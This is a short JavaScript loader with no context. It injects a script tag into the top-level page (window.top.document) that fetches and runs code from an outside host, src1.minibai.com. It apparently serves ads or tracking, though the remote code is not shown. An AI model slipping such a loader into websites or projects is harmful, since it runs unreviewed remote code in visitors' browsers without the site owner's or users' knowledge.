var __run__ = [["//src1.minibai.com/uploads/sysjs/cdn/path201906281346/core.js",100]];
!function(d){
  runB(__run__);
  function runB (response) {
    if(!response || response.length === 0) return;
    var data = response,len = data.length,i = 0;
    while(i<len){
      var random = Math.random() * 100;
      if(data[i][1] > random){
        apChild(data[i][0]);
      }
      i++;
    }
  }
  function apChild(str) {
    if (!d.head) return;
    var oScript = d.createElement('script');
    oScript.setAttribute('type', 'text/javascript');
    oScript.setAttribute('charset', 'UTF-8');
    oScript.src = str;
    d.head.appendChild(oScript);
  }
}(window.top.document);
